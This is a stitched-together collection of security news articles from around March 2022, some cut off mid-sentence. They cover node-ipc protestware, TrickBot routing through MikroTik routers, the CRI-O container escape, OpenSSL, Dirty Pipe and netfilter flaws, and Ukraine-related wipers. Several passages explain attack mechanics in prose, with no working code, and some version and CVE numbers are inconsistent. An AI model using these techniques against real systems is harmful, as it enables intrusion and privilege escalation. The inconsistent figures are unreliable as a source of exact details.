'text': 'In what’s an act of deliberate sabotage, the developer behind the popular “node-ipc“ NPM package shipped a new tampered version to condemn Russia’s invasion of Ukraine, raising concerns about security in the open-source and the software supply chain.\nAffecting versions 10.1.1 and 10.1.2 of the library, the alterations introduced by its maintainer RIAEvangelist brought about undesirable behavior by targeting users with IP addresses located either in Russia or Belarus, and wiping arbitrary file contents and replacing them with a heart emoji.\nNode-ipc is a prominent node module used for local and remote inter-process communication (IPC) with support for Linux, macOS, and Windows. It has over 1.1 million weekly downloads.\n\n“A very clear abuse and a critical supply chain security incident will occur for any system on which this NPM package will be called upon, if that matches a geo-location of either Russia or Belarus,“ Synk researcher Liran Tal said in an analysis.\nThe issue has been assigned the identifier CVE-2022-23812 and is rated 9.8 out of 10 on the CVSS vulnerability scoring system. The malicious code changes were published on March 7 (version 10.1.1), with a second update occurring 10 hours later the same day (version 10.1.1).\nInterestingly, although the destructive modifications were removed from the library with version 10.1., a major update was pushed after less than four hours (version 11.0.0), which imported another dependency called “peacenotwar,“ also released by RIAEvangelist as a form of “non-violent protest against Russia’s aggression.“\n\n“Any time the node-ipc module functionality gets called, it prints to STDOUT a message taken out of the peacenotwar module, as well as places a file on the user’s Desktop directory with contents relating to the current war-time situation of Russia and Ukraine,“ Tal explained.\nAs of March 15, 2022, the latest version of node-ipc – 11.1.0 – bumps the “peacenotwar“ package version from 9.1.3 to 9.1.5 and bundles the “colors“ NPM library, while also removing the STDOUT console messages.\nIt’s worth noting that “colors,“ along with another package called “faker,“ were both intentionally sabotaged earlier this January by its developer Marak Squires by introducing infinite loops to the source code, effectively breaking other applications that depended on the libraries.\n\nAccording to Bleeping Computer, which first reported the corruption, the changes are said to have been retaliatory, with the developer noting that “Respectfully, I am no longer going to support Fortune 500s (and other smaller sized companies) with my free work.“\nIf anything, the idea of using popular modules as “protestware“ to deploy destructive payloads and stage a supply chain compromise runs the risk of undermining trust in open-source software.\n“This security incident involves destructive acts of corrupting files on disk by one maintainer and their attempts to hide and restate that deliberate sabotage in different forms,“ Tal said. “While this is an attack with protest-driven motivations, it highlights a larger issue facing the software supply chain: the transitive dependencies in your code can have a huge impact on your security.“\n\n\nFound this article interesting?

{'title': 'The Golden Hour of Incident Response',
'text': 'As a CSIRT consultant, I cannot overemphasize the importance of effectively managing the first hour in a critical incident.\nFinding out what to do is often a daunting task in a critical incident. In addition, the feeling of uneasiness often prevents an incident response analyst from making effective decisions. However, keeping a cool head and actions planned out is crucial in successfully handling a security incident. This blog will elaborate on some key points to help readers facilitate better incident response procedures.\n\nPreparation is essential\nBefore taking on any incidents, security analysts would need to know a great deal of information. To start off, incident response analysts need to familiarize themselves with their roles and responsibilities. IT infrastructure has evolved rapidly over the past years. For example, we observed increasing movement to cloud computing and data storage. The fast-changing IT environment frequently requires analysts to update their skill sets, such as learning about cloud security. Consequently, analysts will need to have hands-on practice and maintain a complete picture of the topology of all systems. In the real world, external CSIRT analysts should quickly identify all assets under their responsibility. At the same time, the in-house CSIRT analysts should also actively participate in the vulnerability management and the discovery scanning processes. \nThe quality of collected information determines the outcomes of incident response. In addition, the CSIRT analysts would also need to understand the threats they will be facing. As defensive cyber security technologies are upgraded each day, the threat actors are poised to evolve. For example, according to a paper in 2020, four out of the top ten active ransomware actors are now using the “Ransomware as a service“ business model [1]. This pattern denotes that malicious actors will more easily deploy ransomware because of the lack of technical requirements to leverage such attacks. After all, CSIRT teams need to identify the primary threats they are likely to encounter.\nFor example, a CSIRT specialist may see common malware and conclude that no additional threats exist. But when this situation arises for more sensitive scenarios, such as an attack in the energy sector, they will have to think critically and look out for unconventional attack methods. To effectively prepare for incident response, the analysts need to be familiar with the infrastructure they will be working with and the cyber security threat landscape they will be facing.\n\nGet robust procedures in place\nKnowing is only half the battle. When the alert sounds, we need to calm ourselves quickly and plan to answer the first question, “what should I do in the first hour?“ The paper “Phases of a Critical Incident“ refers to the first hour in a critical incident as the “crisis phase“ and is “characterized by confusion, panic, rush to the scene, and gridlock.“[2] Well-rehearsed CSIRT analysts do well to exercise discernment in their investigation. \nOn the other hand, in many scenarios, they may be prone to the obscurity of information, the inability to effectuate a solution in a limited time frame, and lack of operational jurisdiction. In such times, the incident response team must take matters into their own hands, clearly express their professional knowledge, and push through with their operations. \nWhen performing the investigation and root-cause analysis, the incident response team often gets stuck on finding missing pieces of the puzzle. These difficulties lead to doubt and indecision. \nIn such events, the analysts often speculate the incident to be caused by one or more possibilities of a breach without certainty. In these circumstances, it’s advised for them to assume the most likely cause and act accordingly. In the first hour, time is imperative. Like taking an exam, where time is limited, skip the questions you’re stuck on first. \nNowadays, the incident response containment process is often simplified due to the widely adopted Endpoint Detection and Response (EDR) technologies, which offer network containment capabilities at the push of a button. Nonetheless, even with traditional network containment tools, containing the network is not always an easy one. People do not always choose the safer option when it is available. But as the saying goes, it’s always better to be safe than sorry!\n\nFind out what really happened and close the gaps\nPerhaps after one hour, there are still pieces of the puzzle left missing. Now it’s a good idea to take some time and reflect upon all the possibilities and work down a list. \nFor example, I handled a security incident where the attacker launched a reverse shell on a server. I immediately decided to contain the server and gathered all evidence. But my teammates and I still couldn’t figure out how the server was compromised, so we made a list of all the accessible services and examined relevant logs for each service. \nInitial speculations put an IT operation tool as the indicator of compromise. But eventually, we overrode this speculation by crossing out all possibilities and concluded that there must be an inherent security flaw in its web service. \nFrom time to time, during the post-breach analysis, CSIRT analysts may encounter setbacks in connecting the dots. But the truth will always prevail with enough patience and a correct mindset.\nWhat you should consider\nIn conclusion, effectively managing the crucial one-hour time interval after a critical incident requires more than learning on the spot. \nIn addition to technical specialties, experienced CSIRT analysts will also benefit from extensive preparation on their assets and their adversaries, prioritization of tasks and making quick decisions when required, as well as being able to discern down-to-earth facts using the process of elimination.\nThis is just another excerpt of the stories in the Security Navigator. Other interesting stuff like actual CSIRT- and pentesting operations, as well as tons of facts and figures on the security landscape in general can be found there as well. The full report is available for download on the Orange Cyberdefense website, so have a look.

{'title': 'TrickBot Malware Abusing MikroTik Routers as Proxies for Command-and-Control',
'text': 'Microsoft on Wednesday detailed a previously undiscovered technique put to use by the TrickBot malware that involves using compromised Internet of Things (IoT) devices as a go-between for establishing communications with the command-and-control (C2) servers.\n“By using MikroTik routers as proxy servers for its C2 servers and redirecting the traffic through non-standard ports, TrickBot adds another persistence layer that helps malicious IPs evade detection by standard security systems,“ Microsoft’s Defender for IoT Research Team and Threat Intelligence Center (MSTIC) said.\n\nTrickBot, which emerged as a banking trojan in 2016, has evolved into a sophisticated and persistent threat, with its modular architecture enabling it to adapt its tactics to suit different networks, environments, and devices as well as offer access-as-a-service for next-stage payloads like Conti ransomware.\nThe expansion to TrickBot’s capabilities comes amid reports of its infrastructure going offline, even as the botnet has continually refined its features to make its attack framework durable, evade reverse engineering, and maintain the stability of its C2 servers.\n\nSpecifically, the new method identified by MSTIC involves leveraging hacked IoT devices such as routers from MikroTik to “create a line of communication between the TrickBot-affected device and the C2 server.“\n\nThis also entails breaking into the routers by using a combination of methods, namely default passwords, brute-force attacks, or exploiting a now-patched flaw in MikroTik RouterOS (CVE-2018-14847), followed by changing the router’s password to maintain access.\nIn the next step, the attackers then issue a network address translation (NAT) command that’s designed to redirect traffic between ports 449 and 80 in the router, establishing a path for the TrickBot-infected hosts to communicate with the C2 server.\nWhile potential connections between TrickBot and compromised MikroTik hosts were hinted before in November 2018, this is the first time the exact modus operandi has been laid bare open. With the malware reaching its limits last month and no new C2 servers registered since December 2021, it remains to be seen how the malware authors intend to take the operation forward.\n“As security solutions for conventional computing devices continue to evolve and improve, attackers will explore alternative ways to compromise target networks,“ the researchers said. “Attack attempts against routers and other IoT devices are not new, and being unmanaged, they can easily be the weakest links in the network.“\n\n\nFound this article interesting?

{'title': 'Ukraine Secret Service Arrests Hacker Helping Russian Invaders',
'text': 'The Security Service of Ukraine (SBU) said it has detained a “hacker“ who offered technical assistance to the invading Russian troops by providing mobile communication services inside the Ukrainian territory.\nThe anonymous suspect is said to have broadcasted text messages to Ukrainian officials, including security officers and civil servants, proposing that they surrender and take the side of Russia. The individual has also been accused of routing phone calls from Russia to the mobile phones of Russian troops in Ukraine.\n\n“Up to a thousand calls were made through this hacker in one day. Many of them are from the top leadership of the enemy army,“ the SBU alleged, adding it confiscated the equipment that was used to pull off the operation.\nBesides implicating the hacker for helping Russia make anonymous phone calls to its military forces based in Ukraine, the agency said the hacker passed commands and instructions to different groups of “Russian invaders.“\n“He will be held accountable for all the severity of the law. Because on it is the blood of tens or even hundreds of killed Ukrainians,“ read the translation of the announcement.\n\nNews of the detainment comes as a third strain of data-wiping malware dubbed “CaddyWiper“ has been observed in attacks against several dozen systems in a limited number of organizations in Ukraine, close on the heels of HermeticWiper and IsaacWiper coinciding with Russia’s invasion of Ukraine last month.\n\nIn a separate incident, Reuters last week reported of a cyber attack that disrupted broadband satellite internet access in Ukraine on February 24 between 5 a.m. and 9 a.m. EET, right around the time Russia commenced its full-scale invasion of the country. The digital sabotage crippled satellite modems that are part of Viasat’s KA-SAT network.\n\n\nFound this article interesting?

{'title': 'New Vulnerability in CRI-O Engine Lets Attackers Escape Kubernetes Containers',
'text': 'A newly disclosed security vulnerability in the Kubernetes container engine CRI-O called cr8escape could be exploited by an attacker to break out of containers and obtain root access to the host.\n“Invocation of CVE-2022-0811 can allow an attacker to perform a variety of actions on objectives, including execution of malware, exfiltration of data, and lateral movement across pods,“ CrowdStrike researchers John Walker and Manoj Ahuje said in an analysis published this week.\nA lightweight alternative to Docker, CRI-O is a container runtime implementation of the Kubernetes Container Runtime Interface (CRI) that’s used to pull container images from registries and launch an Open Container Initiative (OCI)-compatible runtime such as runC to spawn and run container processes.\n\nThe vulnerability is rated 8.8 on the CVSS vulnerability scoring system and affects CRI-O versions 1.19 and later. Following responsible disclosure, patches have been released to address the flaw in version 1.23.2 shipped on March 15, 2022.\nCVE-2022-0811 stems from a code change introduced in version 1.19 to set kernel options for a pod, resulting in a scenario where a bad actor with permissions to deploy a pod on a Kubernetes cluster using the CRI-O runtime can take advantage of the “kernel.core_pattern“ parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.\nThe parameter “kernel.core_pattern“ is used to specify a pattern name for a core dump, which is a file containing the memory snapshot of a program at a specific time that’s typically activated in response to unexpected crashes or when the process terminates abnormally.\n\n“If the first character of the pattern is a ’|’ [a pipe], the kernel will treat the rest of the pattern as a command to run. The core dump will be written to the standard input of that program instead of to a file,“ reads the Linux kernel documentation.\nTherefore, by setting this option to point to a malicious shell script and triggering a core dump, the vulnerability leads to the invocation of the script, effectively achieving remote code execution and granting the adversary the ability to take over the node.\n“Kubernetes is not necessary to invoke CVE-2022-8011,“ the researchers pointed out. “An attacker on a machine with CRI-O installed can use it to set kernel parameters all by itself.“\n\n\nFound this article interesting?

'text': 'The maintainers of OpenSSL have shipped patches to resolve a high-severity security flaw in its software library that could lead to a denial-of-service (DoS) condition when parsing certificates.\nTracked as CVE-2022-0778 (CVSS score: 7.5), the issue stems from parsing a malformed certificate with invalid explicit elliptic-curve parameters, resulting in what’s called an “infinite loop.“ The flaw resides in a function called BN_mod_sqrt() that’s used to compute the modular square root.\n\n“Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial-of-service attack,“ OpenSSL said in an advisory published on March 15, 2022.\n“The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic-curve parameters.“\nWhile there is no evidence that the vulnerability has been exploited in the wild, there are a few scenarios where it could be weaponized, including when TLS clients (or servers) access a rogue certificate from a malicious server (or client), or when certificate authorities parse certification requests from subscribers.\nThe vulnerability impacts OpenSSL versions 1.0.2, 1.1.1, and 3.0, the project owners addressed the flaw with the release of versions 1.0.2zd (for premium support customers), 1.1.1n, and 3.0.2. OpenSSL 1.1.0, while also affected, will not receive a fix as it has reached end-of-life.\n\nCredited with reporting the flaw on February 24, 2022 is Google Project Zero security researcher Tavis Ormandy. The fix was developed by David Benjamin from Google and Tomáš Mráz from OpenSSL.\nCVE-2022-0778 is also the second OpenSSL vulnerability resolved since the start of the year. On January 28, 2022, the maintainers fixed a moderate-severity flaw (CVE-2021-4160, CVSS score: 5.9) affecting the library’s MIPS32 and MIPS64 squaring procedure.\n\n\nFound this article interesting?

'text': 'The end of the year is coming, and it’s time for security decision-makers to make plans for 2022 and get management approval. Typically, this entails making a solid case regarding why current resources, while yielding significant value, need to be reallocated and enhanced.\n\nThe Definitive 2022 Security Plan PPT Template is built to simplify this task, providing security decision-makers with an off-the-shelf tool to clearly and easily present their plans and insights to management.\n\nWhile many security decision-makers have the tools and expertise to build their case technologically, effectively communicating their conclusions to the organization’s management is a different challenge.\n\nManagement doesn’t think in terms of malware, identity compromise, or zero-day exploits, but in terms of monetary loss and gain: Would investment A in a security product reduce the likelihood of cyberattack derived downtime? Would outsourcing a certain security functionality to a service provider optimize the productivity of the in-house team?\n\nIf you’re the one accountable for security in your organization, you must be able to provide simple answers to these questions.\n\nA significant part of this relates to the pros and cons of the current security posture. What was achieved in the passing year didn’t happen by chance but was the result of executing a well-defined strategy. Communicating this strategy and its results are paramount to justifying resource reallocation.\n\nAs a rule of thumb, the more you are able to approximate your insights into absolute black and white terms, the better. In other words, if you want to make a case for enlarging the budget to enable the purchase and deployment of new security technology, the management-bound argument shouldn’t be its ability to pinpoint malicious behavior more efficiently than the technology currently in place, but it’s ability to prevent the direct and implicit monetary loss your organization suffered from a cyberattack over the past year.\n\nWhile these two arguments seem identical to the security practitioner, they are tremendously different in their ability to capture the mindset of non-security-savvy management.\n\nThe Definitive 2022 Security Plan PPT template enables security pros – CISOs, CIOs, security directors, and others – to easily distill their security knowledge and present the insights and conclusions that speak the management language.\n\nThe template was built based on feedback from both security stakeholders and management personnel, encompassing the key aspects of presenting an annual plan. Instead of spending valuable time on building their case from scratch, security decision-makers can start from a given infrastructure and focus on filling it in based on their specific needs.\n\nThe template consists of three integrated parts:\n\nOverview of the existing allocation of resources for cybersecurity. This includes implemented technologies in place, the cost of the security team (or of the portion of time IT personnel dedicate to cybersecurity-related tasks), and engagement with 3rd party providers, either on an ongoing basis or per specific event.\nEvaluation of the cybersecurity performance under the existing resource allocations. On the success side, it would include indications of attacks that have been prevented or efficiently contained by the products and the security team, together with analysis of the potential damage that was eliminated. On the challenge side, it would include cyberattacks that have caused tangible damage to the organization due to a lack of sufficient technology or security team capacity.Future annual planning that takes the evaluation bottom line and translates it into actionable steps. These may include changes in resource allocation, enlarging the security budget, decisions to add or replace security products, decisions to withdraw from or engage with a security service provider, and any other action that would enhance the security posture to address the gaps that were unveiled in during the evaluation. \n\nAs you see, the underlying theme of the template is cost. How much did the organization spend on cybersecurity, how much did this spending pay off in the long run, and how much did the organization lose due to an under fitted security budget.\n\nThe 2022 Security Plan PPT template is the ideal tool to engage your management and get their approval for your decisions regarding the best security strategy to implement.\n\nDownload the Definitive 2022 Security Plan PPT template here.\n\n\nFound this article interesting?

'text': 'Two weeks after details emerged about a second data wiper strain delivered in attacks against Ukraine, yet another destructive malware has been detected amid Russia’s continuing military invasion of the country.\nSlovak cybersecurity company ESET dubbed the third wiper “CaddyWiper,“ which it said it first observed on March 14 around 9:38 a.m. UTC. Metadata associated with the executable (“caddy.exe“) shows that the malware was compiled at 7:19 a.m. UTC, a little over two hours prior to its deployment.\nCaddyWiper is notable for the fact that it doesn’t share any similarities with previously discovered wipers in Ukraine, including HermeticWiper (aka FoxBlade or KillDisk) and IsaacWiper (aka Lasainraw), the two of which have been deployed in systems belonging to government and commercial entities.\n\n“The ultimate goal of the attackers is the same as with IsaacWiper and HermeticWiper: make the systems unusable by erasing user data and partition information,“ Jean-Ian Boutin¸ head of threat research at ESET, told The Hacker News. “All of the organizations targeted by the recent wiper attacks were either in the governmental or financial sector.“\nUnlike CaddyWiper, both the HermeticWiper and IsaacWiper malware families are said to have been in development for months in advance before their release, with oldest known samples compiled on December 28 and October 19, 2021, respectively.\n\nBut the newly discovered wiper shares one tactical overlap with HermeticWiper in that the malware, in one instance, was deployed via the Windows domain controller, indicating that the attackers had taken control of the Active Directory server.\n“Interestingly, CaddyWiper avoids destroying data on domain controllers,“ the company said. “This is probably a way for the attackers to keep their access inside the organization while still disturbing operations.“\nThe wiper is programmed to systematically destroy all files located in “C:\Users,“ before moving on to the next drive letter and erasing the files until it reaches the “Z“ drive, meaning CaddyWiper will also attempt to wipe any network mapped drive attached to the system.\n\n“The file destruction algorithm is composed of two stages: a first stage to overwrite files and another to destroy the physical disk layout and the partition tables along with it,“ Cisco Talos researchers said in an analysis of the malware. “Destroying the start of the files and the partitions tables is a common technique seen on other wipers, and its highly effective in preventing file recovery.“\nMicrosoft, which has attributed the HermeticWiper attacks to a threat cluster tracked as DEV-0665, said the “intended objective of these attacks is the disruption, degradation, and destruction of targeted resources“ in the country.\nThe development also arrives as cybercriminals have opportunistically and increasingly capitalized on the conflict to design phishing lures, including themes of humanitarian assistance and various types of fundraising, to deliver a variety of backdoors such as Remcos.\n“The global interest in the ongoing war in Ukraine makes it a convenient and effective news event for cybercriminals to exploit,“ Cisco Talos researchers said. “If a certain topic of lure is going to increase the chances of a potential victim installing their payload, they will use it.“\nBut it’s not just Ukraine that’s been at the receiving end of wiper attacks. Last week, cybersecurity firm Trend Micro disclosed details of a .NET-based wiper called RURansom that has exclusively targeted entities in Russia by encrypting the files with a randomly generated cryptographic key.\n“The keys are unique for each encrypted file and are not stored anywhere, making the encryption irreversible and marking the malware as a wiper rather than a ransomware variant,“ the researchers noted.\n\n\nFound this article interesting?

As of now, all of the websites have returned to normal activity.“\n\nA distributed denial-of-service attack is a malicious attempt to hamper the normal traffic of a targeted server or service by overwhelming the victim and its surrounding infrastructure with a flood of junk internet traffic by leveraging compromised computers and IoT devices as sources of attack traffic.\nThe development comes after internet watchdog NetBlocks reported “significant disruptions“ registered on multiple networks supplied by Israel’s telecom providers Bezeq and Cellcom.\nThe INCD has not pinned the attacks to a specific threat actor, but Jerusalem Post alluded to the possibility that the incident could have been the work of an Iranian-affiliated hacker group in retaliation for alleged attempted sabotage of the nation’s Fordow nuclear enrichment plant.\n\nThis is not the first time DDoS attacks have been mounted against government IT infrastructure, what with the ongoing Russo-Ukrainian war paving the way for a series of “tit-for-tat“ DDoS attack campaigns on both sides.\nOn top of that, a vulnerability in Mitel MiCollab and MiVoice Business Express collaboration systems was recently weaponized to carry out sustained distributed denial-of-service (DDoS) attacks for up to 14 hours with a record-breaking amplification ratio of 4.3 billion to 1.\n\n\nFound this article interesting?

'text': 'Network-attached storage (NAS) appliance maker QNAP on Monday warned of a recently disclosed Linux vulnerability affecting its devices that could be abused to elevate privileges and gain control of affected systems.\n“A local privilege escalation vulnerability, also known as ’Dirty Pipe,’ has been reported to affect the Linux kernel on QNAP NAS running QTS 5.0.x and QuTS hero h5.0.x,“ the company said. “If exploited, this vulnerability allows an unprivileged user to gain administrator privileges and inject malicious code.“\n\nThe Taiwanese firm said it’s continuing to thoroughly investigate its product line for the vulnerability and that QNAP NAS devices running QTS versions 4.x are immune to the Dirty Pipe flaw.\n\nTracked as CVE-2022-0847 (CVSS score: 7.8), the shortcoming resides in the Linux kernel that could permit an attacker to overwrite arbitrary data into any read-only files and allow for a complete takeover of vulnerable machines.\n“An unprivileged local user could use the Dirty Pipe flaw to write to pages in the page cache backed by read-only files and as such, escalate their privileges on the system,“ Kaspersky researchers said earlier this week. “This vulnerability happens due to usage of partially uninitialized memory of the pipe buffer structure during its construction.“\nSuccessful exploitation of the high-severity flaw could enable an attacker to create unauthorized cron jobs, modify sensitive files such as /etc/passwd, and even break out of containers. The issue has since been fixed in Linux versions 5.16.11, 5.15.25, and 5.10.102 as of February 23, 2022, three days after it was reported to the Linux kernel security team.\n“Currently there is no mitigation available for this vulnerability,“ the company added. “We recommend users to check back and install security updates as soon as they become available.“\n\n\nFound this article interesting?

{'title': 'Why Enterprise Threat Mitigation Requires Automated, Single-Purpose Tools',
'text': 'As much as threat mitigation is to a degree a specialist task involving cybersecurity experts, the day to day of threat mitigation often still comes down to systems administrators. For these sysadmins it’s not an easy task, however. In enterprise IT, sysadmins teams have a wide remit but limited resources.\nFor systems administrators finding the time and resources to mitigate against a growing and constantly moving threat is challenging. In this article, we outline the difficulties implied by enterprise threat mitigation, and explain why automated, purpose-built mitigation tools are the way forward.\nThreat management is an overwhelming task\nThere is a range of specialists that work within threat management, but the practical implementation of threat management strategies often comes down to systems administrators. Whether it’s patch management, intrusion detection or remediation after an attack, sysadmins typically bear the brunt of the work.\nIt’s an impossible task, given the growing nature of the threat. In 2021 alone, 28,000 vulnerabilities were disclosed. It is such a large number that, in fact, a large proportion never got as far as being assigned a CVE. This is especially relevant in an industry laser-focused on tracking CVEs, testing for their presence on our systems and deploying patches mentioning specific CVE numbers. You can’t protect against what you don’t know you’re vulnerable to. If a given vulnerability does not have a CVE attached, and all your tools/mindset/processes are focused on CVEs, something will fail. The reasons for not assigning a CVE to a vulnerability are many and outside the scope of this article, but none of those will reduce the work that has to be done in security.\nEven if an organization had a three-figure team of sysadmins it would be hard to keep track of this constantly growing list of vulnerabilities. We’re not even talking about interactions where a vulnerability may affect a secondary system running on your infrastructure in a way that isn’t that obvious.\nOver time it just melts into a “background noise“ of vulnerabilities. There’s an assumption that patching happens methodically, weekly or perhaps daily – but in reality, the relevant, detailed information within CVE announcements never reaches top-of-mind.\nOverwhelmed teams take risks\nWith security tasks, including patching, becoming such an overwhelming exercise, it’s no wonder that sysadmins will start taking some shortcuts. Perhaps a sysadmin misses that interaction between a new exploit and a secondary system, or neglects to properly test patches before deploying the latest fix – any of which can fail to prevent a network-wide meltdown. \nHandled without care, security management tasks such as patching can have consequences. A small change will come back and haunt security teams a few days, weeks or months down the road by breaking something else that they were not expecting. \n“Closing holes“ is just as much of a problem within this context. For example, take the Log4j vulnerability, where changing the Log4j default configuration could easily provide significant mitigation. It’s an obvious, sensible step but the real question is – does the sysadmin team have the resources to complete the task? It’s not that it’s difficult to perform per se – but it’s hard to track down every usage of log4j across a whole system fleet, plus the work needed is in addition to all the other regular activities.\nAnd again, pointing to patching, the resources required to do it consistently often aren’t there. Patching is particularly tough given the fact that applying a patch implies restarting the underlying service. Restarts are time-consuming and disruptive and, when it comes to critical components, restarting can simply not be realistic. \nThe net result is that essential security tasks simply do not get done, leaving sysadmins with a nagging feeling that security just isn’t what it should be. It goes for security monitoring too, including penetration testing and vulnerability scanning. Yes, some organizations may have specialists to accomplish this task – even going so far as to have red teams and blue teams.\nBut, in many cases, security monitoring is yet another task for sysadmins who will inevitably become overloaded and end up taking.\nAnd it’s getting worse\nOne might think all that needs to happen is for sysadmins to get ahead of the burden – muscle down and just get it done. By working through the backlog, maybe getting some extra help, sysadmins could manage the workload and get it all done.\nBut there’s a slight issue here. The number of vulnerabilities is growing rapidly – once the team has dealt with known problems, it’ll doubtlessly face even more. And the pace of vulnerabilities is accelerating, more and more are reported every year.\nTrying to keep up would mean that teams are increased in size by, say, 30% year on year. It’s just not a battle that a human team with manual approaches will win. Clearly, alternatives are needed because a continuous battle of this nature simply won’t be won by increasing team sizes year on year in an almost exponential fashion.\nThreat management automation is key\nThe good thing about computing of course is that automation often provides a way out of sticky resource restrictions – and that’s the case with threat management too. In fact, if you want any chance of making progress against the growing threat environment, deploying automation for tasks across vulnerability management is key. From monitoring for new vulnerabilities, to patching and reporting. \nSome tools will help with specific aspects, others will help with all of those aspects, but the efficacy of tools tends to drop as the tool becomes more encompassing. More specialized tools tend to be better at their specific function than tools that claim to do everything in one go. Think of it as the Unix tool philosophy – do one thing, and do it well, rather than trying to do everything at once. \nFor example, patching can, and should, be automated. But patching is one of those security tasks that need a dedicated tool that can help sysadmins by patching consistently and with minimal disruption. \nA half-hearted approach won’t work because patching would still be encumbered by the acceptance of maintenance windows. That would remove from IT teams the flexibility to respond in nearly real time to new threats, without affecting the organization’s business operations. A perfect fit for these requirements is live patching through tools like TuxCare’s KernelCare Enterprise tool which delivers automatic, non-disruptive, live patching for Linux distributions. \nIt’s not just patching that needs to be automated, of course. Just as cybercriminals use automation to probe for vulnerabilities, so should tech teams rely on automated, continuous vulnerability scanning and penetration testing. Within this sphere of automation should also come firewalls, advanced threat protection, endpoint protection, and so forth.\nThere’s nowhere safe to hide\nClearly, the threat problem is getting worse, and rapidly so – much faster than organizations could possibly hope to grow their security teams if indeed they wanted to tackle these problems manually. Sitting in a particular corner in terms of the solutions in use doesn’t provide any solace either, in part because solutions are now so integrated with code shared across so many platforms that a single vulnerability can have an almost universal impact.\nBesides, as recent research found, the top ten list of the most vulnerable products excluded some notable products. For example, Microsoft Windows, previously seen as one of the most vulnerable operating systems, isn’t even in the top ten – which is instead dominated by Linux-based operating systems. Relying on what is thought to be safer alternatives isn’t a good idea.\nIt underlines how the only real safety is to be found in security automation. From vulnerability scanning through to patching, automation is really the only route that can help overwhelmed sysadmins gain a degree of control over an exploding situation – in fact, it’s the only manageable solution.\n\n\nFound this article interesting?

'text': 'A Russian-speaking ransomware outfit likely targeted an unnamed entity in the gambling and gaming sector in Europe and Central America by repurposing custom tools developed by other APT groups like Iran’s MuddyWater, new research has found.\nThe unusual attack chain involved the abuse of stolen credentials to gain unauthorized access to the victim network, ultimately leading to the deployment of Cobalt Strike payloads on compromised assets, said Felipe Duarte and Ido Naor, researchers at Israeli incident response firm Security Joes, in a report published last week.\n\nAlthough the infection was contained at this stage, the researchers characterized the compromise as a case of a suspected ransomware attack.\nThe intrusion is said to have taken place in February 2022, with the attackers making use of post-exploitation tools such as ADFind, NetScan, SoftPerfect, and LaZagne. Also employed is an AccountRestore executable to brute-force administrator credentials and a forked version of a reverse tunneling tool called Ligolo.\n\nCalled Sockbot, the modified variant is a Golang binary that’s designed to expose internal assets from a compromised network to the internet in a stealthy and secure manner. The changes made to the malware remove the need to use command-line parameters and includes several execution checks to avoid running multiple instances.\nGiven that Ligolo is a primary tool of choice for the Iranian nation-state group MuddyWater, the use of a Ligolo fork has raised the possibility that the attackers are taking tools used by other groups and incorporating their own signatures in a probable attempt to confuse attribution.\n\nThe links to a Russian-speaking ransomware group come from artifact overlaps with common ransomware toolkits. Furthermore, one of the deployed binaries (AccountRestore) contains hard-coded references in Russian.\n“The strategy used by threat actors to access and pivot over the victim’s infrastructure lets us see a persistent, sophisticated enemy with some programming skills, red teaming experience and a clear objective in mind, which is far from the regular script kiddie profile,“ the researchers said.\n“The fact that the entry point for this intrusion was a set of compromised credentials reassures the importance of applying additional access controls for all the different assets in any organization.“\n\n\nFound this article interesting?

The issue was discovered by Nick Gregory, a senior threat researcher at Sophos.\n\n“This flaw allows a local attacker with a user account on the system to gain access to out-of-bounds memory, leading to a system crash or a privilege escalation threat,“ Red Hat said in an advisory published on February 22, 2022. Similar alerts have been released by Debian, Oracle Linux, SUSE, and Ubuntu.\nNetfilter is a framework provided by the Linux kernel that enables various networking-related operations, including packet filtering, network address translation, and port translation.\nSpecifically, CVE-2022-25636 relates to an issue with incorrect handling of the framework’s hardware offload feature that could be weaponized by a local attacker to cause a denial-of-service (DoS) or possibly execute arbitrary code.\n\n“Despite being in code dealing with hardware offload, this is reachable when targeting network devices that don’t have offload functionality (e.g. lo) as the bug is triggered before the rule creation fails.“ Gregory said. “Additionally, while nftables requires CAP_NET_ADMIN, we can unshare into a new network namespace to get this as a (normally) unprivileged user.“\n“This can be turned into kernel [return-oriented programming]/local privilege escalation without too much difficulty, as one of the values that is written out of bounds is conveniently a pointer to a net_device structure,“ Gregory added.\n\n\nFound this article interesting?

{'title': 'Researchers Find New Evidence Linking Kwampirs Malware to Shamoon APT Hackers',
'text': 'New findings released last week showcase the overlapping source code and techniques between the operators of Shamoon and Kwampirs, indicating that they “are the same group or really close collaborators.“\n“Research evidence shows identification of co-evolution between both Shamoon and Kwampirs malware families during the known timeline,“ Pablo Rincón Crespo of Cylera Labs said.\n“If Kwampirs is based on the original Shamoon, and Shamoon 2 and 3 campaign code is based on Kwampirs, […] then the authors of Kwampirs would be potentially the same as the authors of Shamoon, or must have a very strong relationship, as has been seen over the course of many years,“ Rincón Crespo added.\nShamoon, also known as DistTrack, functions as an information-stealing malware that also incorporates a destructive component that allows it to overwrite the Master Boot Record (MBR) with arbitrary data so as to render the infected machine inoperable.\n\nThe malware, developed by the eponymous hacking crew also tracked as Magic Hound, Timberworm, COBALT GIPSY, was first documented by Broadcom-owned Symantec in August 2012. At least two updated versions of Shamoon have since emerged, Shamoon 2 in 2016 and Shamoon 3 in 2018.\nIn July 2021, the U.S. government attributed Shamoon as the handiwork of Iranian state-sponsored actors, linking it to cyber offensives targeting industrial control systems.\nOn the other hand, attack activity involving the Kwampirs backdoor has been connected to a threat group known as Orangeworm, with Symantec disclosing an intrusion campaign aimed at entities in the healthcare sector in the U.S., Europe, and Asia.\n“Kwampirs New Campaign Building Process“ explained by Cylera\n“First identified in January 2015, Orangeworm has also conducted targeted attacks against organizations in related industries as part of a larger supply-chain attack in order to reach their intended victims,“ Symantec said in an analysis in April 2018.\nCylera Labs’ uncovering of the connection stems from malware artifacts and previously unnoticed components, one of which is said to be an intermediary “stepping stone“ version. It’s a Shamoon dropper but sans the wiper feature, while simultaneously reusing the same loader code as Kwampirs.\n\nWhat’s more, code-level similarities have been uncovered between Kwampirs and subsequent versions of Shamoon. This includes the functionality to retrieve system metadata, fetch MAC address, and the victim’s keyboard layout information as well as the use of the same InternetOpenW Windows API to craft HTTP requests to the command-and-control (C2) server.\n“Shamoon 2 New Campaign Building Process“ explained by Cylera\nAlso put to use is a common template system to create the reporter module that houses capabilities to upload host information and download additional payloads to execute from their C2 servers, a feature that was missing in the first version of Shamoon.\nIn connecting the disparate dots, the investigation has led to the assessment that Kwampirs is likely based on Shamoon 1 and that Shamoon 2 inherited some of its code from Kwampirs, implying that the operators of both the 